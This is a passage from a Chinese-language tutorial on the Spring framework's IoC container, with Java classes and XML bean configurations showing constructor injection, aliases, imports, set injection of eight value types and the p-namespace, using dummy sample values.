<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//new User这个对象时便默认使用这个无参构造方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;User的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name=&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ajnuy&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) applicationContext.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.show();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>有参构造构建对象</p>
<p>1.下标赋值</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    第一种方式，使用默认的无参构造</span></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;User的无参构造&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    第二种方式，使用构造器构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name=&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    第一种方式，使用默认参数构造--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    第二种方式，有参构造--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    1，使用下标--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ajnuy构造器构造&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	2.通过类型进行创建，有可能多个参数是同一种类型，不推荐使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    第一种方式，使用默认的无参构造</span></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;User的无参构造&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    第二种方式，使用构造器构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name=&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    第一种方式，使用默认参数构造--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    第二种方式，使用构造器构造--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    1，使用下标--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;constructor-arg index=&quot;0&quot; value=&quot;ajnuy构造器构造&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    2，使用参数类型--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ajnuy构造器构造，使用参数类型&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	3.使用参数的名称构造在，重点掌握</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    第一种方式，使用默认的无参构造</span></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;User的无参构造&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    第二种方式，使用构造器构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name=&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    第一种方式，使用默认参数构造--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    第二种方式，使用构造器构造--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    1，使用下标--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;constructor-arg index=&quot;0&quot; value=&quot;ajnuy构造器构造&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    2，使用参数类型--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;ajnuy构造器构造，使用参数类型&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    3，使用参数的名称构造--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        注意，这里和无参构造是不同的，一个是用的构造器构造（有参），另一个使用的是默认的property标签进行构造--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ajnuy，使用属性的名称构造&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结，所有放在bean容器中管理的对象，在一开始加载的时候便已经被new出来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>也就是这个时候</p>
<h3 id="5-spring配置"><a href="#5-spring配置" class="headerlink" title="5. spring配置"></a>5. spring配置</h3><h4 id="1-别名"><a href="#1-别名" class="headerlink" title="1. 别名"></a>1. 别名</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    给用户创建一个别名，可以使用别名来创建对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;userNickName&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-bean的配置"><a href="#2-bean的配置" class="headerlink" title="2. bean的配置"></a>2. bean的配置</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">id:对象初始化创建后的具体名称</span></span><br><span class="line"><span class="comment">class:对象对应的具体的类的地址</span></span><br><span class="line"><span class="comment">name:可以为每个初始化的对象取多个别名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user2 u2 u&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;bean构造测试&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-import导入"><a href="#3-import导入" class="headerlink" title="3. import导入"></a>3. import导入</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans2.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans3.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在团队开放中，可以将不同成员写的bean配置文件合并为一个</p>
<h3 id="6-依赖注入"><a href="#6-依赖注入" class="headerlink" title="6. 依赖注入"></a>6. 依赖注入</h3><h4 id="1-构造器注入（前面所讲的构造器）"><a href="#1-构造器注入（前面所讲的构造器）" class="headerlink" title="1. 构造器注入（前面所讲的构造器）"></a>1. 构造器注入（前面所讲的构造器）</h4><h4 id="2-set注入（重点）"><a href="#2-set注入（重点）" class="headerlink" title="2. set注入（重点）"></a>2. set注入（重点）</h4><ul>
<li>依赖注入<ul>
<li>依赖：bean对象的创建依赖于容器</li>
<li>注入：bean对象的所有属性，通过容器来注入</li>
</ul>
</li>
</ul>
<p>【环境搭建】</p>
<p>1.复杂类型</p>
<p>2.真实测试对象</p>
<p>八种真实的注入类型</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;address&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.Address&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.Student&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        第一种，普通值的注入，value--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ajnuy&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第二种，对象的注入，ref--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;address&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第三种，数组的注入，array--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>三体<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>哈利波特<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>三国演义<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>水浒传<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第四种，列表的注入，list--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>唱<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>跳<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>rap<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>篮球<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第五种，map的注入，map--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;身份证&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111222223631411&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;银行卡&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1468464131314861321&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第六种，set的注入，set--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>PUBG<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>BF<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>COD<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>APEX<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第七种，null的注入，null--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        第八种，property的注入，props--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;driver&quot;</span>&gt;</span>3231<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;url&quot;</span>&gt;</span>www.da.com<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;password&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-p命名空间"><a href="#3-p命名空间" class="headerlink" title="3. p命名空间"></a>3. p命名空间</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;age&quot; value=&quot;20&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    与上述写法相同，简化写法--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;ajnuy&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 